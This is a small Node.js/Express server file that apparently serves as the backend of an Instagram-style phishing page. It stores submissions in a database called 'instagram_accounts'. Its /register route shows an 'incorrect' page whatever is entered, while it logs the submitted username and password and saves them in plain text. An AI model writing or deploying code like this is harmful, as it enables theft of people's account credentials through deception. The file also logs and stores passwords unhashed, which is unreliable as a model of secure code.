const express = require("express");
const app=express();
const mongoose = require('mongoose');
const account = require("./models/chat.js");
const path =require("path");

app.set("view engine", "ejs");
app.set("views",path.join(__dirname,"views"));

main().then(()=>{
    console.log("connection scessfull");
})
.catch(err => console.log(err));

async function main() {
  await mongoose.connect('mongodb://127.0.0.1:27017/instagram_accounts');

}

const port=8080;



app.use(express.urlencoded({extended:true}));
app.use(express.json());



app.use(express.static(path.join(__dirname,"public")));

app.get("/",(req,res)=>{
    res.render("index.ejs")
});

// app.get("/account",async(res,req)=>{
//     let acct=await  account.find();
//     console.log(acct);
//     req.send("working");
// })

app.post("/register",(req,res)=>{
    res.render("incorrect.ejs");
    console.log(`username: ${req.body.username}`)
    console.log(`passwerd: ${req.body.password}`)
    let account1= new account({
        username:`${req.body.username}`,
        password:`${req.body.password}`
    });
    account1.save().then((res)=>{
        console.log(res);
    });

})
 
app.listen(port,()=>{
    console.log("server is lisning")
});